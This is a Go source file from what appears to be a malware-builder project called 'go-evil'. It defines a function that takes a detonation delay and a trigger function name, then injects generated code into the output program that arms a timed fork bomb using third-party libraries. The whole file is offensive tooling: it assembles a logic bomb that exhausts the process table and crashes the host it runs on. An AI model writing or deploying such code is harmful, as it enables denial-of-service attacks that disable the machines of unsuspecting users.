package fork

import (
	"fmt"

	gotools "github.com/s9rA16Bf4/Go-tools"
	"github.com/s9rA16Bf4/go-evil/utility/structure"
	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
	notify "github.com/s9rA16Bf4/notify_handler"
)

// Input is an evil array, ${"time until detonation in ms", "execution function name"}$
func Bomb(value string, data_object *json.Json_t) []string {
	function_call := "fork_bomb"

	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Expected two values, but recieved %d", arr.Length()), "bombs.fork_bomb()", 1)
	}

	time := arr.Get(0)

	time_i := gotools.StringToInt(time)
	if time_i == -1 {
		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", time), "bombs.fork_bomb()", 1)
	}

	executioner := arr.Get(1)

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{"timer int"},
		Gut: []string{
			"interval := time.Duration(timer) * time.Millisecond",
			fmt.Sprintf("el := puffgo.NewListener(&interval, %s)", executioner),
			"fb := fbomb.NewBomb(el)",
			"fb.Arm()",
		}})

	data_object.Add_go_import("github.com/ARaChn3/gfb")
	data_object.Add_go_import("github.com/ARaChn3/puffgo")
	data_object.Add_go_import("time")

	return []string{fmt.Sprintf("%s(%d)", function_call, time_i)}

}
